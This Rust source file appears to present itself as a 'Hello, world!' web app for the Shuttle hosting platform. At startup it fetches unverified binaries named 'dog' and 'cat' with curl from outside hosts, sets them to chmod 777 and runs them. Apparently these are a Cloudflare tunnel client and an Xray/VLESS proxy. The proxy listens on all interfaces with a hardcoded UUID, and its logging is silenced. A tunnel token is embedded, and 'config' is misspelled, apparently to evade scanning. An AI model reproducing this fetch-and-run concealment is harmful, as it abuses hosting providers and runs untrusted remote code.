use axum::{routing::get, Router, response::IntoResponse};
use regex::Regex;
use serde_json::{json, Value};
use std::env;
use std::fs::{self, File, read_to_string};
use std::io::Write;
use std::path::Path;
use std::process::Command;
use tokio::time::{sleep, Duration};
use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
use base64::Engine as _;

async fn hello_world() -> &'static str {
    "Hello, world!"
}

async fn setup_environment() {

    let env_vars = [
        ("ARGO_AUTH", "eyJhIjoiZWQ1ZDBiOTEzZTQyYTEyNmJiZDI3OTY0Nzg4MjUzMzEiLCJ0IjoiNjQwZDJiNzUtNzA5Yy00ZTZkLWI0NDQtNjZjMDhlOWI0NjQ3IiwicyI6IlpEWmlNelEyTm1ZdFpXVXlNQzAwTTJKakxUbG1aVFF0Wm1NMFpUbGpOVFl6TURNMiJ9"),   
        ("FILE_PATH", "./tmp"),
        ("ARGO_PORT", "8080"), 
        ("SUB_PATH", "sub"), 
    ];

    for (key, default_value) in env_vars {
        if env::var(key).is_err() {
            env::set_var(key, default_value);
        }
    }
}

async fn read_sub() -> impl IntoResponse {
    let file_path = env::var("FILE_PATH").unwrap_or_else(|_| "./tmp".to_string());
    let sub_path = env::var("SUB_PATH").unwrap_or_else(|_| "sub".to_string()); 
    match read_to_string(format!("{}/{}.txt", file_path, sub_path)) { 
        Ok(content) => content,
        Err(_) => "Failed to read sub.txt".to_string(),
    }
}

async fn create_cmnfig_files() {
    let file_path = env::var("FILE_PATH").unwrap_or_else(|_| "./tmp".to_string());
    let argo_port = env::var("ARGO_PORT").unwrap_or_else(|_| "8080".to_string()); 
    let argo_auth = env::var("ARGO_AUTH").unwrap_or_default();
    
    if !Path::new(&file_path).exists() {
        fs::create_dir_all(&file_path).expect("Failed to create directory");
    }

    let old_files = ["boot.log", "sub.txt", "cmnfig.json", "tunnel.json", "tunnel.yml"];
    for file in old_files.iter() {
        let file_path = format!("{}/{}", file_path, file);
        let _ = fs::remove_file(file_path);
    }

    
    let cmnfig = json!({
  "log":{
      "access":"/dev/null",
      "error":"/dev/null",
      "loglevel":"none"
    },
  "inbounds": [
    {
      "port": 8080,
      "listen":"0.0.0.0",
      "protocol": "vless",
      "settings": {
        "clients": [
          {
            "id": "115c906a-6d95-429c-989a-0d1f50a05311"
          }
        ],
         "decryption":"none"
      },
      "streamSettings": {
        "network": "xhttp",
        "xhttpSettings": {
		"mode": "stream-one",
        "path": "/vle123"
        }
      }
    }
  ],
  "outbounds": [
    {
      "protocol": "freedom",
      "tag": "direct"
    },
    {
      "protocol": "blackhole",
      "tag": "block"
    }
  ]
});

    let cmnfig_str = serde_json::to_string_pretty(&cmnfig).unwrap();
    fs::write(format!("{}/cmnfig.json", file_path), cmnfig_str)
        .expect("Failed to write cmnfig.json");
}

async fn download_files() {
    let file_path = env::var("FILE_PATH").unwrap_or_else(|_| "./tmp".to_string());
    let arch = Command::new("uname")
        .arg("-m")
        .output()
        .map(|output| String::from_utf8_lossy(&output.stdout).trim().to_string())
        .unwrap_or_default();

    let file_info = match arch.as_str() {
        "arm" | "arm64" | "aarch64" => vec![
            ("https://amd64.ssss.nyc.mn/2go", "dog"),
            ("https://github.com/Dproyouton/cat/releases/download/123/cat25", "cat"),
        ],
        "amd64" | "x86_64" | "x86" => vec![
            ("https://amd64.ssss.nyc.mn/2go", "dog"),
            ("https://github.com/Dproyouton/cat/releases/download/123/cat25", "cat"),
        ],
        _ => vec![],
    };

    for (url, filename) in file_info {
        let filepath = format!("{}/{}", file_path, filename);
        if !Path::new(&filepath).exists() {
            Command::new("curl")
                .args(["-L", "-sS", "-o", &filepath, url])
                .status()
                .expect("Failed to download file");
            
            Command::new("chmod")
                .args(["777", &filepath])
                .status()
                .expect("Failed to set permissions");
        }
    }
}

async fn run_services() {
    let file_path = env::var("FILE_PATH").unwrap_or_else(|_| "./tmp".to_string());
    
    if Path::new(&format!("{}/cat", file_path)).exists() {
        Command::new(format!("{}/cat", file_path))
            .args(["-c", &format!("{}/cmnfig.json", file_path)])
            .spawn()
            .expect("Failed to start web");
    }

    sleep(Duration::from_secs(2)).await;

    if Path::new(&format!("{}/dog", file_path)).exists() {
        let argo_auth = env::var("ARGO_AUTH").unwrap_or_default();
        let argo_port = env::var("ARGO_PORT").unwrap_or_default();
        
        let boot_log_path = format!("{}/boot.log", file_path);
        let tunnel_yml_path = format!("{}/tunnel.yml", file_path);
        let url = format!("http://localhost:{}", argo_port);

        let args = if argo_auth.len() >= 120 && argo_auth.len() <= 250 {
            vec!["tunnel", "--edge-ip-version", "auto", "--no-autoupdate", 
                 "--protocol", "http2", "run", "--token", &argo_auth]
        } else if argo_auth.contains("TunnelSecret") {
            vec!["tunnel", "--edge-ip-version", "auto", 
                 "--cmnfig", &tunnel_yml_path, "run"]
        } else {
            vec!["tunnel", "--edge-ip-version", "auto", "--no-autoupdate",
                 "--protocol", "http2", "--logfile", &boot_log_path,
                 "--loglevel", "info", "--url", &url]
        };

        Command::new(format!("{}/dog", file_path))
            .args(&args)
            .spawn()
            .expect("Failed to start bot");
    }
}


#[shuttle_runtime::main]
async fn main() -> shuttle_axum::ShuttleAxum {
    setup_environment().await;
    create_cmnfig_files().await;
    download_files().await;
    run_services().await;
   
    println!("App is running!");

    let router = Router::new()
        .route("/", get(hello_world))
        .route(&format!("/{}", env::var("SUB_PATH").unwrap_or_else(|_| "sub".to_string())), get(read_sub));

    Ok(router.into())
}
